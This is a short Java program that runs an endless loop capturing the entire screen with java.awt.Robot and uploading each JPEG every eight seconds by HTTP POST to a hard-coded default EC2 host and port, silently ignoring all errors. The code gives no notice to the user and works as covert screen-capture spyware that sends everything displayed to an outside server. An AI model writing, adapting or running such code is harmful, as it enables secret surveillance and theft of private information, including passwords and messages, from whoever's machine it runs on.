package home;

import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.http.client.ClientHttpResponse;
import org.springframework.web.client.DefaultResponseErrorHandler;
import org.springframework.web.client.RestTemplate;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

public class Main {
    public static void main(String[] args) throws Exception {
        Robot robot = new Robot();
        RestTemplate restTemplate = new RestTemplate();
        restTemplate.setErrorHandler(new DefaultResponseErrorHandler() {
            @Override
            public void handleError(ClientHttpResponse response) throws IOException {
                // deliberately does nothing
            }
        });

        String host = System.getProperty("host", "ec2-3-16-89-198.us-east-2.compute.amazonaws.com");
        String port = System.getProperty("port", "8080");

        Rectangle rectangle = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());

        while (true)
            try {
                BufferedImage screenFullImage = robot.createScreenCapture(rectangle);
                ByteArrayOutputStream baos = new ByteArrayOutputStream(900_000);
                ImageIO.write(screenFullImage, "jpg", baos);
                byte[] bytes = baos.toByteArray();

                HttpHeaders headers = new HttpHeaders();
                headers.set(HttpHeaders.CONTENT_TYPE, MediaType.IMAGE_JPEG_VALUE);
                HttpEntity<byte[]> httpEntity = new HttpEntity<>(bytes, headers);
                String url = String.format("http://%s:%s/ly-screen-upload", host, port);
                restTemplate.exchange(url, HttpMethod.POST, httpEntity, String.class);
                Thread.sleep(8000);
            }
            catch (Throwable __) { /* who cares */ }
    }
}
